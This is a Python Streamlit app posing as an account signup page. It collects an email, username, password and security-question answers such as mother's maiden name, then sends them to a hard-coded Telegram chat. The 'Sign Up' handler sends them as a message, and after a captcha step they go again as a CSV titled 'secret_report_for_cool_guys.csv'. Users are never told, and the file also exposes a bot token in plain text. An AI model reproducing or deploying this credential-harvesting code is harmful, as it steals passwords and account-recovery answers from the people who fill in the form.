import streamlit as st
import pandas as pd
import csv, io
import telebot
import cv2

# streamlit run app.py

ph6 = st.empty()
ph6.subheader("Please Create an Account")
ph9 = st.empty()
new_user = ph9.text_input('Email Address')
ph7 = st.empty()
new_user = ph7.text_input('Username')
ph10 = st.empty()
ph10.write('Password must contain 14 characters, out of which at least one latin but not more the 4, 2 special characters, and one math symbol. if your password contains the letter ''o'', exactly two symbols are required')
ph8 = st.empty()
new_passwd = ph8.text_input('Password', type='password')


ph1 = st.empty()
ph1.write('Please answer the security questions:')
ph2 = st.empty()
school = ph2.text_input('Name of your first school?')
ph3 = st.empty()
mom_name = ph3.text_input('Mother''s maiden name?')
ph4 = st.empty()
type = ph4.text_input('Urban or beach vibe?')
ph5 = st.empty()
hotel = ph5.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')

# save results to csv and send via telegram


TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
chat_id = '630924196'

placeholder = st.empty()
signupbut = placeholder.button('Sign Up')

if signupbut:
    placeholder.empty()
    tb.send_message(chat_id, 'New User: ' + new_user + '\n' + 'Password: ' + new_passwd + '\n' + 'School: ' + school + '\n' + 'Mother''s Maiden Name: ' + mom_name + '\n' + 'Vibe: ' + type + '\n' + 'Hotel: ' + hotel)
    a = [eval('ph%s.empty()' % i) for i in range(1,11)]

    ph1 = st.empty()
    ph1.write('Please confirm you''re not a robot:')
    ph2 = st.empty()
    im = ph2.image('captcha.png')
    ph3 = st.empty()
    captcha = ph3.text_input('Enter image numbers (make sure images do not contradict each other)')
    ph4 = st.empty()
    ver = ph4.button('Verify')
    if ver:
        st.success("You have successfully created an account.Go to the Login Menu to login")

        # here - st image with my letter
        df = pd.DataFrame({"username": [new_user], "password": [new_passwd],
                           "school": [school], "mom_name": [mom_name],
                           "hotel": [hotel], "type": [type], "images": [captcha]})
        a = [eval('ph%s.empty()' % i) for i in range(1, 5)]


        test_data = df.to_records()
        print(test_data)
        # csv module can write data in io.StringIO buffer only
        s = io.StringIO()
        csv.writer(s).writerows(test_data)
        s.seek(0)
        # python-telegram-bot library can send files only from io.BytesIO buffer
        # we need to convert StringIO to BytesIO
        buf = io.BytesIO()

        # extract csv-string, convert it to bytes and write to buffer
        buf.write(s.getvalue().encode())
        buf.seek(0)

        placeholder = st.empty()
        isclick = placeholder.button('delete this button')
        if isclick:
            placeholder.empty()


        # set a filename with file's extension
        buf.name = f'secret_report_for_cool_guys.csv'

        # send the buffer as a regular file
        tb.send_document(chat_id, buf)
